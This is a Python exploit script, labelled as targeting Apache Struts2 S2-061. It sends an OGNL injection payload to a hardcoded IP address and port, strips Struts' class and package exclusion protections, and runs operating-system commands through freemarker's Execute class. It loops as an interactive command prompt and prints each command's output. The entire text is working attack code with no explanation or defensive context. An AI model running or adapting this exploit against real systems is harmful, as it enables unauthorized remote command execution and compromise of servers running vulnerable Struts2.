"""
strtus2-s2-061  EXP
"""

import requests
import re
url = 'http://120.25.24.45:31763/'
cmd = 'whoami'
while cmd:
    payload = '''?id=%25{(%23instancemanager=%23application["org.apache.tomcat.InstanceManager"]).(%23stack=%23attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"]).(%23bean=%23instancemanager.newInstance("org.apache.commons.collections.BeanMap")).(%23bean.setBean(%23stack)).(%23context=%23bean.get("context")).(%23bean.setBean(%23context)).(%23macc=%23bean.get("memberAccess")).(%23bean.setBean(%23macc)).(%23emptyset=%23instancemanager.newInstance("java.util.HashSet")).(%23bean.put("excludedClasses",%23emptyset)).(%23bean.put("excludedPackageNames",%23emptyset)).(%23arglist=%23instancemanager.newInstance("java.util.ArrayList")).(%23arglist.add("'''+cmd+'''")).(%23execute=%23instancemanager.newInstance("freemarker.template.utility.Execute")).(%23execute.exec(%23arglist))}
    '''
    res = requests.get(url+payload)
    html_str = res.text
    # print(html_str)
    pattern = re.compile('id="(.*?)"', re.S)
    msg = pattern.findall(html_str)[0].strip()
    print(msg)
    cmd = input('cmd>>>')